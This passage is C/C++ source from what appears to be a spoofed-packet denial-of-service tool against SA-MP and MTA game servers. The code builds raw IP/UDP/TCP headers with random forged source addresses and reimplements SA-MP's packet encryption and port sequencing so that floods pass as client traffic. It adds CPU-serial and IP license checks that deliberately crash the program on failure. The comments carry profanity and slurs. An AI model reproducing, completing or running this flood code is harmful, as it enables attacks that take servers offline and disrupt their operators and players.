	void samp_vv36(struct iphdr* iph, struct udphdr* udph);
	void samp_vv37(struct iphdr* iph, struct udphdr* udph);
	void samp_vv38(struct iphdr* iph, struct udphdr* udph);







	void samp_dd1(struct iphdr* iph, struct udphdr* udph);
	void samp_dd2(struct iphdr* iph, struct udphdr* udph);
	void samp_dd3(struct iphdr* iph, struct udphdr* udph);
	void samp_dd4(struct iphdr* iph, struct udphdr* udph);
	void samp_dd5(struct iphdr* iph, struct udphdr* udph);
	void samp_dd6(struct iphdr* iph, struct udphdr* udph);
	void samp_dd7(struct iphdr* iph, struct udphdr* udph);
	void samp_dd8(struct iphdr* iph, struct udphdr* udph);
	void samp_dd9(struct iphdr* iph, struct udphdr* udph);
	void samp_dd10(struct iphdr* iph, struct udphdr* udph);
	void samp_dd11(struct iphdr* iph, struct udphdr* udph);
	void samp_dd12(struct iphdr* iph, struct udphdr* udph);
	void samp_dd13(struct iphdr* iph, struct udphdr* udph);
	void samp_dd14(struct iphdr* iph, struct udphdr* udph);
	void samp_dd15(struct iphdr* iph, struct udphdr* udph);
	void samp_dd16(struct iphdr* iph, struct udphdr* udph);
	void samp_dd17(struct iphdr* iph, struct udphdr* udph);
	void samp_dd18(struct iphdr* iph, struct udphdr* udph);
	void samp_dd19(struct iphdr* iph, struct udphdr* udph);
	void samp_dd20(struct iphdr* iph, struct udphdr* udph);
	void samp_dd21(struct iphdr* iph, struct udphdr* udph);
	void samp_dd22(struct iphdr* iph, struct udphdr* udph);
	void samp_dd23(struct iphdr* iph, struct udphdr* udph);
	void samp_dd24(struct iphdr* iph, struct udphdr* udph);
	void samp_dd25(struct iphdr* iph, struct udphdr* udph);
	void samp_dd26(struct iphdr* iph, struct udphdr* udph);
	void samp_dd27(struct iphdr* iph, struct udphdr* udph);
	void samp_dd28(struct iphdr* iph, struct udphdr* udph);
	void samp_dd29(struct iphdr* iph, struct udphdr* udph);
	void samp_dd30(struct iphdr* iph, struct udphdr* udph);
	void samp_dd31(struct iphdr* iph, struct udphdr* udph);
	void samp_dd32(struct iphdr* iph, struct udphdr* udph);
	void samp_dd33(struct iphdr* iph, struct udphdr* udph);
	void samp_dd34(struct iphdr* iph, struct udphdr* udph);
	



	
	void eth_header();
};
extern Packet* PKT;
Packet* PKT = new Packet;
 
uint32_t GetTickCount() 
{
    enum 
	{
    #ifdef CLOCK_BOOTTIME
        boot_time_id = CLOCK_BOOTTIME
    #else
        boot_time_id = 7
    #endif
    };
    struct timespec spec;
    clock_gettime(boot_time_id, &spec);
    return (uint32_t)(((uint64_t)spec.tv_sec) * 1000 + ((uint64_t)spec.tv_nsec) / 1000000);
} 
 
class License
{
private:
	void GetPSN(char* PSN)
	{
		int varEAX, varEBX, varECX, varEDX;
		char str[9];
		__asm__ __volatile__("cpuid"   : "=a" (varEAX), "=b" (varEBX), "=c" (varECX), "=d" (varEDX) : "a" (1));
		sprintf(str, "%08X", varEAX);
		sprintf(PSN, "%C%C%C%C%C%C%C%C", str[0], str[1], str[2], str[3], str[4], str[5], str[6], str[7]);
		__asm__ __volatile__("cpuid"   : "=a" (varEAX), "=b" (varEBX), "=c" (varECX), "=d" (varEDX) : "a" (3));
		sprintf(str, "%08X", varEDX);
		sprintf(PSN, "%s%C%C%C%C%C%C%C%C", PSN, str[0], str[1], str[2], str[3], str[4], str[5], str[6], str[7]);
		sprintf(str, "%08X", varECX);
		sprintf(PSN, "%s%C%C%C%C%C%C%C%C", PSN, str[0], str[1], str[2], str[3], str[4], str[5], str[6], str[7]);
	}
	static inline void native_cpuid(unsigned int* eax, unsigned int* ebx, unsigned int* ecx, unsigned int* edx)
	{
		/* ecx is often an input as well as an output. */
		asm volatile("cpuid"
			: "=a" (*eax),
			"=b" (*ebx),
			"=c" (*ecx),
			"=d" (*edx)
			: "0" (*eax), "2" (*ecx));
	}
	unsigned long CalculateInfo()
	{
		unsigned long result = 0;
		unsigned int eax, ebx, ecx, edx;
		char PSN[30];
		eax = 1; /* processor info and feature bits */
		native_cpuid(&eax, &ebx, &ecx, &edx);
		GetPSN(PSN);
		result += *((long*)&PSN);
		result += eax & 0xF;
		result += (eax >> 4) & 0xF;
		result += (eax >> 8) & 0xF;
		result += (eax >> 12) & 0x3;
		result += (eax >> 16) & 0xF;
		result += (eax >> 20) & 0xFF;
		return ~result;
	}
	unsigned long GetSerial()
	{
		unsigned long result = 0;
		result += CalculateInfo();
		result -= (result - (CalculateInfo() & 0x1D)) * ((unsigned long)floor(log10(abs((int)result))) + 1);
		return ~result;
	}
protected:
	char* GetKey(int iCode)
	{
		if (iCode > 2000000000)
			return "CODE_TOO_HIGH";

		char* szEncrypted = malloc(0x1e * sizeof(char)); //фикс под си линукс
		char* abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		int i;
		for (i = 0; i < 29; i++)
		{
			szEncrypted[i] = abc[((iCode ^ i) * 3) & 0x1D];
			if (i % 5 <= 0 && i != 0)
			{
				i++;
				szEncrypted[i] = '-';
			}
		}
		szEncrypted[29] = '\0';
		return szEncrypted;
	}
public:
	bool IPCheck()
	{
		struct ifaddrs* ifAddrStruct = NULL;
		struct ifaddrs* ifa = NULL;
		void* tmpAddrPtr = NULL;
		bool check = false;
		getifaddrs(&ifAddrStruct);
		for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next)
		{
			if (!ifa->ifa_addr)
			{
				continue;
			}
			if (ifa->ifa_addr->sa_family == AF_INET)
			{
				tmpAddrPtr = &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr;
				char addressBuffer[INET_ADDRSTRLEN];
				inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
				if (strcmp(addressBuffer, OBFUSCATE(IP)) == 0)
				{
					check = true;
				}
			}
		}
		if (ifAddrStruct != NULL) freeifaddrs(ifAddrStruct);
		if (check == false) //Segmentation fault ибо нехуй
		{
			const char* s = "YourMommy";
			*(char*)s = 'H';
			int* ptr = (int*)0;
			*ptr = 1;
			char* p1 = NULL;
			char* p2;
			char* p3 = (char*)malloc(20);
			free(p3);
			int const nmax = 10;
			int i, n, a[n];
			for (;;)
			malloc(sizeof(int));
			exit(-1);
			abort();
		}
		return 0;
	}
	bool KeyCheck()
	{
		bool check = false;
		if (strcmp(GetKey(GetSerial()), OBFUSCATE(KEY)) == 0)
		{
			check = true;
		}
		if (check == false) //Segmentation fault ибо нехуй
		{
			const char* s = "YourMommy";
			*(char*)s = 'H';
			int* ptr = (int*)0;
			*ptr = 1;
			char* p1 = NULL;
			char* p2;
			char* p3 = (char*)malloc(20);
			free(p3);
			int const nmax = 10;
			int i, n, a[n];
			for (;;)
			malloc(sizeof(int));
			exit(-1);
			abort();
		}
		return 0;
	}
	bool PassCheck(char* checksumma)
	{
		bool check = false;
		if (strcmp(checksumma, OBFUSCATE(sampchecksumma)) == 0)
		{
			check = true;
		}
		if (check == false) //Segmentation fault ибо нехуй
		{
			const char* s = "YourMommy";
			*(char*)s = 'H';
			int* ptr = (int*)0;
			*ptr = 1;
			char* p1 = NULL;
			char* p2;
			char* p3 = (char*)malloc(20);
			free(p3);
			int const nmax = 10;
			int i, n, a[n];
			for (;;)
			malloc(sizeof(int));
			exit(-1);
			abort();
		}
		return 0;
	}
};
extern License* SL;
License* SL = new License;

class utils
{
private:
	unsigned int rand_cmwc(void)
	{
		unsigned long long t, a = 18782LL;
		static unsigned int i = 4095;
		unsigned int x, r = 0xfffffffe;
		i = (i + 1) & 4095;
		t = a * Q[i] + c;
		c = (t >> 32);
		x = t + c;
		if (x < c)
		{
			x++;
			c++;
		}
		return (Q[i] = r - x);
	}
	unsigned short int sampchecksum(unsigned short int* addr, int len) //тоже из сампст
	{
		int nleft = len;
		int sum = 0;
		unsigned short int* w = addr;
		unsigned short int answer = 0;
		while (nleft > 1)
		{
			sum += *w++;
			nleft -= sizeof(unsigned short int);
		}
		if (nleft == 1)
		{
			*(unsigned char*)(&answer) = *(unsigned char*)w;
			sum += answer;
		}
		sum = (sum >> 16) + (sum & 0xFFFF);
		sum += (sum >> 16);
		answer = ~sum;
		return (answer);
	}
	unsigned short rcsum(unsigned short* buf, int nwords) //ДРЕВНЯЯ ХУЕТА ВРЕМЕН ВИН2000
	{
		unsigned long sum;
		for (sum = 0; nwords > 0; nwords--)
			sum += *buf++;
		sum = (sum >> 16) + (sum & 0xffff);
		sum += (sum >> 16);
		return ~sum;
	}
public: 
	unsigned short csum (unsigned short *buf, int count)
	{
		register unsigned long sum = 0;
		while( count > 1 ) { sum += *buf++; count -= 2; }
		if(count > 0) { sum += *(unsigned char *)buf; }
		while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
		return (unsigned short)(~sum);
	}
	unsigned short tcpcsum(struct iphdr *iphtcp, struct tcphdr *tcph) 
	{
		struct tcp_pseudo
		{
			unsigned long src_addr;
			unsigned long dst_addr;
			unsigned char zero;
			unsigned char proto;
			unsigned short length;
		} 
		pseudohead;
		unsigned short total_len = iph->tot_len;
		pseudohead.src_addr=iph->saddr;
		pseudohead.dst_addr=iph->daddr;
		pseudohead.zero=0;
		pseudohead.proto=IPPROTO_TCP;
		pseudohead.length=htons(sizeof(struct tcphdr));
		int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
		unsigned short *tcp = malloc(totaltcp_len);
		memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
		memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
		unsigned short output = csum(tcp,totaltcp_len);
		free(tcp);
		return output;
	}
	int powInt(int x, int y)
	{
		for (int i = 0; i < y; i++)
		{
			x *= 10;
		}
		return x;
	}
	int convert(char* chars)
	{
		int sum = 0;
		int len = strlen(chars);
		for (int x = 0; x < len; x++)
		{
			int n = chars[len - (x + 1)] - '0';
			sum = sum + powInt(n, x);
		}
		return sum;
	}
	unsigned int rand_cmwcc(void)
	{
		unsigned long long t, a = 18782LL;
		static unsigned int i = 4095;
		unsigned int x, r = 0xfffffffe;
		i = (i + 1) & 4095;
		t = a * Q[i] + c;
		c = (t >> 32);
		x = t + c;
		if (x < c)
		{
			x++;
			c++;
		}
		return (Q[i] = r - x);
	}
	void samp_relevance(int dPort) //by FR4NK1T0H
	{
		static int timerms = 0;
		if ( GetTickCount() - timerms > nexttonext) //1 раз в 44 секунды. Динамически настраивать разрешено, от 33 секунд до 120 секунд, не более(240000ms в особых случаях)
		{
			while(256 <= dPort)
			{
				dPort = dPort - 256;
			}
			//printf(OBFUSCATE("\x1B[31m [sequence 0](+1) %d -> %02x \x1B[0m\n"), sampvector, (char)(sampvector & 0xFFFF));
			sequence++;
			for(int i = 0; i != 128; i++)
			{
				sampvector = sampvector + 1;
				sequence++;
				sprintf(conversion, "%d", sampvector);
				if (dPort == sequence - 1)
				{
					//printf(OBFUSCATE("\x1B[31m  \n \n --------> %02x <-------- \x1B[0m\n \n"), sampvector);
					break;
				}
				//printf(OBFUSCATE("\x1B[31m %d -> %02x  %s \x1B[0m\n"),  sequence - 1, (char)(sampvector & 0xFFFF), conversion);
				sampvector = sampvector - 3;
				if(sequence == 8)
				{
				   // printf(OBFUSCATE("\x1B[31m [sequence 8](+16) \x1B[0m"));
					sampvector = sampvector + 16;
				}
				else if(sequence == 16)
				{
					sampvector = sampvector - 16;
			   // printf(OBFUSCATE("\x1B[31m [sequence 16](-16) \x1B[0m"));
				}
				else if(sequence == 24)
				{
					sampvector = sampvector + 16;
				   // printf(OBFUSCATE("\x1B[31m [sequence 24](+16) \x1B[0m"));
				}
				else if(sequence == 32)
				{
					sampvector = sampvector + 48;
				   // printf(OBFUSCATE("\x1B[31m [sequence 32](+48) \x1B[0m"));
				}
				else if(sequence ==  40)
				{   
					sampvector = sampvector + 16;
				   // printf(OBFUSCATE("\x1B[31m [sequence 40](+16) \x1B[0m"));
				}
				else if(sequence == 48)
				{   
					sampvector = sampvector - 16;
				   // printf(OBFUSCATE("\x1B[31m [sequence 48](-16) \x1B[0m"));
				}
				else if(sequence == 56)
				{   
					sampvector = sampvector + 16;
					//printf(OBFUSCATE("\x1B[31m [sequence 56](+16) \x1B[0m"));
				}
				else if(sequence == 64)
				{
					sampvector = sampvector + 48;
					//printf(OBFUSCATE("\x1B[31m sequence [64](+48) \x1B[0m"));
				}
				else if(sequence == 72)
				{
					sampvector = sampvector + 16;
				   // printf(OBFUSCATE("\x1B[31m sequence [72](+16) \x1B[0m"));
				}
				else if(sequence == 80)
				{
					sampvector = sampvector - 16;
				   // printf(OBFUSCATE("\x1B[31m sequence [80](-16) \x1B[0m"));
				}
				else if(sequence == 88)
				{
					sampvector = sampvector + 16;
					//printf(OBFUSCATE("\x1B[31m sequence [88](+16) \x1B[0m"));
				}
				else if(sequence == 96)
				{
					sampvector = sampvector + 48;
					//printf(OBFUSCATE("\x1B[31m sequence [96](+48) \x1B[0m"));
				}
				else if(sequence == 104)
				{
					sampvector = sampvector + 16;
				   // printf(OBFUSCATE("\x1B[31m sequence [104](+16) \x1B[0m"));
				}
				else if(sequence == 112)
				{
					sampvector = sampvector - 16;
				   // printf(OBFUSCATE("\x1B[31m sequence [112](-16) \x1B[0m"));
				}
				else if(sequence == 120)
				{
					sampvector = sampvector + 16;
					//printf(OBFUSCATE("\x1B[31m sequence [120](+16) \x1B[0m"));
				}
				else if(sequence == 128)
				{
					sampvector = sampvector + 48;
				   // printf(OBFUSCATE("\x1B[31m sequence [128](+48) \x1B[0m"));
				}
				else if(sequence == 136)
				{
					sampvector = sampvector + 16;
				   // printf(OBFUSCATE("\x1B[31m sequence [136](+16) \x1B[0m"));
				}
				else if(sequence == 144)
				{
					sampvector = sampvector - 16;
					//printf(OBFUSCATE("\x1B[31m sequence [144](-16) \x1B[0m"));
				}
				else if(sequence == 152)
				{
					sampvector = sampvector + 16;
					//printf(OBFUSCATE("\x1B[31m sequence [152](+16) \x1B[0m"));
				}
				else if(sequence == 160)
				{
					//printf(OBFUSCATE("\x1B[31m sequence [160](+48) \x1B[0m"));
					sampvector = sampvector + 48;
				}
				else if(sequence == 168)
				{
				   // printf(OBFUSCATE("\x1B[31m sequence [168](+16) \x1B[0m"));
					sampvector = sampvector + 16;
				}
				else if(sequence == 176)
				{
					//printf(OBFUSCATE("\x1B[31m sequence [176](-16) \x1B[0m"));
					sampvector = sampvector - 16;
				}
				else if(sequence == 184)
				{
					//printf(OBFUSCATE("\x1B[31m sequence [184](+16) \x1B[0m"));
					sampvector = sampvector + 16;
				}
				else if(sequence == 192)
				{
				   // printf(OBFUSCATE("\x1B[31m sequence [192](+48) \x1B[0m"));
					sampvector = sampvector + 48;
				}
				else if(sequence == 200)
				{
					//printf(OBFUSCATE("\x1B[31m sequence [200](+16) \x1B[0m"));
					sampvector = sampvector + 16;
				}
				else if(sequence == 208)
				{
					//printf(OBFUSCATE("\x1B[31m sequence [208](-16) \x1B[0m"));
					sampvector = sampvector - 16;
				}
				else if(sequence == 216)
				{
					//printf(OBFUSCATE("\x1B[31m sequence [216](+16) \x1B[0m"));
					sampvector = sampvector + 16;
				}
				else if(sequence == 224)
				{
					//printf(OBFUSCATE("\x1B[31m sequence [224](+48) \x1B[0m"));
					sampvector = sampvector + 48;
				}
				else if(sequence == 232)
				{
				   // printf(OBFUSCATE("\x1B[31m sequence [232](+16) \x1B[0m"));
					sampvector = sampvector + 16;
				}
				else if(sequence == 240)
				{
					//printf(OBFUSCATE("\x1B[31m sequence [240](-16) \x1B[0m"));
					sampvector = sampvector - 16;
				}
				else if(sequence == 248)
				{
					//printf(OBFUSCATE("\x1B[31m sequence [248](+16) \x1B[0m"));
					sampvector = sampvector + 16;
				}
				else if(sequence == 256)
				{
					sampvector = 22;
					sequence = 1;
				}
				sprintf(conversion, "%d", sampvector);
				sequence++;
				// printf(OBFUSCATE("\x1B[31m %d -> %02x %s \x1B[0m\n"),  sequence - 1, (char)(sampvector & 0xFFFF), conversion);       
				if (dPort == sequence - 1)
				{
					//printf(OBFUSCATE("\x1B[31m  \n \n --------> %02x <-------- \x1B[0m\n \n"), sampvector);
					break;
				}
			}
			timerms = GetTickCount();
		}
    }
	void rkyretardizeDatagram(unsigned char* buf, int len, int port, int unk) //чисто раксамповский, ведь поддержка с++ теперь есть
	{
		unsigned char bChecksum = 0;
		int i;
		for (i = 0; i < len; i++)
		{
			unsigned char bData = buf[i];
			bChecksum ^= bData & 0xAA;
		}
		encrBuffer[0] = bChecksum;
		unsigned char* buf_nocrc = &encrBuffer[1];
		memcpy(buf_nocrc, buf, len);
		int j;
		for (j = 0; j < len; j++)
		{
			buf_nocrc[j] = sampEncrTable[buf_nocrc[j]];
			if (unk)
				buf_nocrc[j] ^= (unsigned char)(port ^ 0xCC);
			unk ^= 1u;
		}
	}
	void kyretardizeDatagram(unsigned char* buf, int len, int port, int unk)
	{
		memcpy(encrBuffer, buf, len);
		unsigned char bChecksum = 0;
		int i;
		for (i = 0; i < len; i++)
		{
			unsigned char bData = buf[i];
			bChecksum ^= (bData & 0xAA);
		}
		encrBuffer[0] = bChecksum;

		unsigned char* buf_nocrc = &encrBuffer[1];
		memcpy(buf_nocrc, buf, len);

		unsigned char bPort = port ^ 0xCCCC;
		unsigned char c = 0;
		for (i = 0; i < len; i++)
		{
			unsigned char bCurByte = buf_nocrc[i];
			unsigned char bCrypt = sampEncrTable[bCurByte];
			buf_nocrc[i] = bCrypt;
			if (unk)
			{
				c = bPort ^ bCrypt;
				buf_nocrc[i] = c;

				--unk;
			}
			else
			{
				c = unk ^ bCrypt;
				buf_nocrc[i] = bCrypt;
				unk = 1;
			}
		}
	}
	void sampEncrypt(unsigned char* buf, int len, int port, int unk)
	{
		memcpy(&sampEncTmpBuff[1], buf, len);

		unsigned char bChecksum = 0;
		int i;
		for (i = 0; i < len; i++)
		{
			unsigned char bData = buf[i];
			bChecksum ^= bData & 0xAA;
		}
		sampEncTmpBuff[0] = bChecksum;

		unsigned char* buf_nocrc = &sampEncTmpBuff[1];
		memcpy(buf_nocrc, buf, len);
		int ii;
		for (ii = 0; ii < len; ii++)
		{
			buf_nocrc[ii] = sampEncrTable[buf_nocrc[ii]];
			if (unk)
				buf_nocrc[ii] ^= (unsigned char)(port ^ 0xCC);
			unk ^= 1u;
		}
		memcpy(buf, &sampEncTmpBuff, len + 1);
	}
	static void samp_crypt(unsigned char* buf, int len, unsigned char* out, unsigned short port) //by GH0ST
	{
		unsigned char check_sum = 0, xored_port = port ^ 0xcc, inv = 0;
		unsigned char* header = out++;
		int i;
		for (i = 0; i < len; i++)
		{
			out[i] = buf[i];
			check_sum ^= out[i] & 0xaa;
			out[i] = sampEncrTable[out[i]];
			if (inv)
				out[i] ^= xored_port;
			inv = !inv;
		}
		*header = check_sum;
	}
	void init_rand(unsigned int x)
	{
		int i;
		Q[0] = x;
		Q[1] = x + PHI;
		Q[2] = x + PHI + PHI;
		for (i = 3; i < 4096; i++)
		{
			Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
		}
	}
	int RandNum(int min_num, int max_num) //удобнее же...
	{
		int result = 0, low_num = 0, hi_num = 0;
		if (min_num < max_num)
		{
			low_num = min_num;
			hi_num = max_num + 1;
		}
		else
		{
			low_num = max_num + 1;
			hi_num = min_num;
		}
		result = (rand_cmwc() % (hi_num - low_num)) + low_num;
		return result;
	}
	void CopyIP(char* inIP, char* outIP) //тип копируем
	{
		short i, nTemp = 0; char cbool = 0;
		for (i = 0; inIP[i] != 0; i++)
		{
			if (inIP[i] != '.')
			{
				nTemp = nTemp * 10 + (short)(inIP[i] - '0');
			}
			else
			{
				outIP[cbool] = (char)nTemp;
				nTemp = 0;
				cbool++;
			}
		}
		outIP[cbool] = (char)nTemp;
	}
	unsigned short checksum_generic(unsigned short* addr, unsigned int count) //https://youtu.be/qeMFqkcPYcg
	{
		register unsigned long sum = 0;
		for (sum = 0; count > 1; count -= 2)
			sum += *addr++;
		if (count == 1)
			sum += (char)*addr;
		sum = (sum >> 16) + (sum & 0xFFFF);
		sum += (sum >> 16);
		return ~sum;
	}
	unsigned short rchecksum(const  struct iphdr* iph, const  struct udphdr* udph, const unsigned short* buf) //тип чексам под ркон
	{
		int clength = ntohs(udph->len) % 2 == 0 ? ntohs(udph->len) : ntohs(udph->len) + 1;
		struct phdr p_hdr = { 0 };
		bzero(&p_hdr, sizeof(struct phdr));
		uint8_t data[sizeof(struct phdr) + clength];
		bzero(data, sizeof(struct phdr) + clength);

		p_hdr.source = iph->saddr;
		p_hdr.dest = iph->daddr;
		p_hdr.protocol = IPPROTO_UDP;
		p_hdr.udph_length = udph->len;

		memcpy(data, &p_hdr, sizeof(struct phdr));
		memcpy(data + sizeof(struct phdr), buf, ntohs(udph->len));

		return rcsum((unsigned short*)data, sizeof(data) / 2);
	}
	void rand_addr(void *to, int len) 
	{
		unsigned long addr[2];
		addr[0] = random(); addr[1] = random();
		memcpy(to, addr, len);
	}
	unsigned short int udp4_checksum(struct iphdr* iph, struct udphdr* udph, unsigned char* payload, int payloadlen) //хуетация взятая из сампст
	{
		char buf[IP_MAXPACKET];
		char* ptr;
		int chksumlen = 0;
		int i;

		ptr = &buf[0];  // ptr points to beginning of buffer buf

		// Copy source IP address into buf (32 bits)
		memcpy(ptr, &iph->saddr, sizeof(iph->saddr));
		ptr += sizeof(iph->saddr);
		chksumlen += sizeof(iph->saddr);

		// Copy destination IP address into buf (32 bits)
		memcpy(ptr, &iph->daddr, sizeof(iph->daddr));
		ptr += sizeof(iph->daddr);
		chksumlen += sizeof(iph->daddr);

		// Copy zero field to buf (8 bits)
		*ptr = 0; ptr++;
		chksumlen += 1;

		// Copy transport layer protocol to buf (8 bits)
		memcpy(ptr, &iph->protocol, sizeof(iph->protocol));
		ptr += sizeof(iph->protocol);
		chksumlen += sizeof(iph->protocol);

		// Copy UDP length to buf (16 bits)
		memcpy(ptr, &udph->len, sizeof(udph->len));
		ptr += sizeof(udph->len);
		chksumlen += sizeof(udph->len);

		// Copy UDP source port to buf (16 bits)
		memcpy(ptr, &udph->source, sizeof(udph->source));
		ptr += sizeof(udph->source);
		chksumlen += sizeof(udph->source);

		// Copy UDP destination port to buf (16 bits)
		memcpy(ptr, &udph->dest, sizeof(udph->dest));
		ptr += sizeof(udph->dest);
		chksumlen += sizeof(udph->dest);

		// Copy UDP length again to buf (16 bits)
		memcpy(ptr, &udph->len, sizeof(udph->len));
		ptr += sizeof(udph->len);
		chksumlen += sizeof(udph->len);

		// Copy UDP checksum to buf (16 bits)
		// Zero, since we don't know it yet
		*ptr = 0; ptr++;
		*ptr = 0; ptr++;
		chksumlen += 2;

		// Copy payload to buf
		memcpy(ptr, payload, payloadlen);
		ptr += payloadlen;
		chksumlen += payloadlen;

		// Pad to the next 16-bit boundary
		for (i = 0; i < payloadlen % 2; i++, ptr++)
		{
			*ptr = 0;
			ptr++;
			chksumlen++;
		}
		return sampchecksum((unsigned short int*) buf, chksumlen);
	}
	unsigned short checksum_tcpudp(struct iphdr* iph, void* buff, unsigned short data_len, int len) //https://youtu.be/izGwDsrQ1eQ :)
	{
		const unsigned short* buf = buff;
		unsigned int ip_src = iph->saddr;
		unsigned int ip_dst = iph->daddr;
		unsigned int sum = 0;
		int length = len;
		while (len > 1)
		{
			sum += *buf;
			buf++;
			len -= 2;
		}
		if (len == 1)
			sum += *((unsigned char*)buf);
		sum += (ip_src >> 16) & 0xFFFF;
		sum += ip_src & 0xFFFF;
		sum += (ip_dst >> 16) & 0xFFFF;
		sum += ip_dst & 0xFFFF;
		sum += htons(iph->protocol);
		sum += data_len;
		while (sum >> 16)
			sum = (sum & 0xFFFF) + (sum >> 16);
		return ((unsigned short)(~sum));
	}
};
extern utils* US;
utils* US = new utils;

void Packet::eth_header() 
{
	if (checked == 3)
	{
		checked += 1;
		strcpy(ifName, OBFUSCATE(DEFAULT_IF));
		/* Open RAW socket to send on */
		sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
		if (sockfd < 0)
		{
			fprintf(stderr, OBFUSCATE("eth socket error\n"));
			exit(-1);
		}
		/* Get the index of the interface to send on */
		memset(&if_idx, 0, sizeof(struct ifreq));
		strncpy(if_idx.ifr_name, ifName, IFNAMSIZ - 1);
		if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
		{
			fprintf(stderr, OBFUSCATE("SIOCGIFINDEX\n"));
			exit(-1);
		}
		/* Get the MAC address of the interface to send on */
		memset(&if_mac, 0, sizeof(struct ifreq));
		strncpy(if_mac.ifr_name, ifName, IFNAMSIZ - 1);
		if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
		{
			fprintf(stderr, OBFUSCATE("SIOCGIFHWADDR\n"));
			exit(-1);
		}
		/* Construct the Ethernet header */
		memset(sendbuf, 0, 1024);
		/* Ethernet header */
		eh->ether_shost[0] = ((uint8_t*)&if_mac.ifr_hwaddr.sa_data)[0];
		eh->ether_shost[1] = ((uint8_t*)&if_mac.ifr_hwaddr.sa_data)[1];
		eh->ether_shost[2] = ((uint8_t*)&if_mac.ifr_hwaddr.sa_data)[2];
		eh->ether_shost[3] = ((uint8_t*)&if_mac.ifr_hwaddr.sa_data)[3];
		eh->ether_shost[4] = ((uint8_t*)&if_mac.ifr_hwaddr.sa_data)[4];
		eh->ether_shost[5] = ((uint8_t*)&if_mac.ifr_hwaddr.sa_data)[5];

		eh->ether_dhost[0] = 0x00;
		eh->ether_dhost[1] = (char)(rand() & 0xFF);
		eh->ether_dhost[2] = (char)(rand() & 0xFF);
		eh->ether_dhost[3] = (char)(rand() & 0xFF);
		eh->ether_dhost[4] = (char)(rand() & 0xFF);
		eh->ether_dhost[5] = (char)(rand() & 0xFF);
		/* Ethertype field */
		eh->ether_type = htons(ETH_P_IP);
		tx_len += sizeof(struct ether_header);

		/* Packet data */
		sendbuf[tx_len++] = (char)(rand() & 0xFF);
		sendbuf[tx_len++] = (char)(rand() & 0xFF);
		sendbuf[tx_len++] = (char)(rand() & 0xFF);
		sendbuf[tx_len++] = (char)(rand() & 0xFF);

		/* Index of the network device */
		socket_address.sll_ifindex = if_idx.ifr_ifindex;
		/* Address length*/
		socket_address.sll_halen = ETH_ALEN;
		/* Destination MAC */
		socket_address.sll_addr[0] = 0x00;
		socket_address.sll_addr[1] = (char)(rand() & 0xFF);
		socket_address.sll_addr[2] = (char)(rand() & 0xFF);
		socket_address.sll_addr[3] = (char)(rand() & 0xFF);
		socket_address.sll_addr[4] = (char)(rand() & 0xFF);
		socket_address.sll_addr[5] = (char)(rand() & 0xFF);
		sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll));
	}
}

void Packet::ip_header(struct iphdr *iph) //и от бабушки ушел и от дедушки ушел. Из любой ситуации сука, сухим из воды
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0; //тоже не нужен
	iph->frag_off = 0; //не понимаю, зачем это было использовать в sampst? Это же лишнее... 
	iph->ttl = prottl; //верните сотку пидары xDDD
	iph->protocol = IPPROTO_UDP;  // о великий 
	iph->check = 0; //Ебнулэнд
	iph->check = US->checksum_generic((unsigned short *)iph, sizeof(struct iphdr)); //Расчет контрольной суммы IP заголовка, по идее должен быть равен 0 но пусть останется как есть
	src_ip[0] = US->RandNum(1, 223);
	src_ip[1] = US->RandNum(1, 255);
	src_ip[2] = US->RandNum(1, 255);
	src_ip[3] = US->RandNum(1, 255);
	iph->saddr = *((unsigned int*)src_ip);
	if (type == 1)
	{
		usleep(pps);
	}
	return;
}

void Packet::iptcp_header(struct iphdr *iphtcp)
{
	iphtcp->ihl = 5;
	iphtcp->version = 4;
	iphtcp->tos = 0;
	iphtcp->frag_off = 0;
	iphtcp->ttl = prottl; //верните сотку пидары xDDD
	iphtcp->protocol = IPPROTO_TCP;
	iphtcp->check = 0;
	iphtcp->check = US->checksum_generic((unsigned short *)iphtcp, sizeof(struct iphdr)); //Расчет контрольной суммы IP заголовка
	snprintf(sourceiptcp, sizeof(sourceiptcp) - 1, "%d.%d.%d.%d", rand() % 180, rand() % 254, rand() % 254, rand() % 254); //https://youtu.be/dQw4w9WgXcQ
	iphtcp->saddr = inet_addr(sourceiptcp); //фулл рандом генерация ип адреса из воздуха(пока генерирует в холостую, тк есть файл aips.txt)
	if (type == 1)
	{
		usleep(pps);
	}
	return;
}



void Packet::samp_type1(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen =  539; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
